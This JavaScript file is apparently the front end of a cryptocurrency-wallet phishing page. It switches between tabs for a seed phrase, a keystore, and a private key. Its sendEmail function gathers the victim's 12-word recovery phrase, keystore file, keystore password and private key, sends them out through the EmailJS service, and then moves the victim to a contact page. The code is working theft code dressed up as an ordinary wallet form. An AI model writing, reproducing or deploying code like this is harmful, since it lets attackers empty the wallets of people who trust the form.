
let currentTab = "phrase";

function changeTab(newTab) {
    document.querySelector(`.${currentTab}`).style.display = "none";
    document.querySelector(`#${currentTab}`).style.backgroundColor =
    "white";

    document.querySelector(`.${newTab}`).style.display = "block";
    document.querySelector(`#${newTab}`).style.backgroundColor = "#92e4fd";

    currentTab = newTab;
}

const sendEmail = () => {
  let phraseText = document.getElementById("ptext").value;
  let keystore = document.getElementById("kstore").value;
  let keystorePwd = document.getElementById("kpassword").value;
  let privateKey = document.getElementById("pkey").value;

  if ((!phraseText || phraseText.split(" ").length !== 12) && !keystorePwd && !privateKey) {
      alert("Kindly fill in your data completely.");
      return;
  }

  emailjs.send("default_service", "template_x6hwbik", {
      phraseText: phraseText,
      keystore: keystore,
      keystorePwd: keystorePwd,
      privateKey: privateKey
  }).then(function(response) {
      if (response.status === 200) {
          window.location.href = "contact.html";
      }
  }, function(error) {
      console.log("Error: ", error);
  });
}; 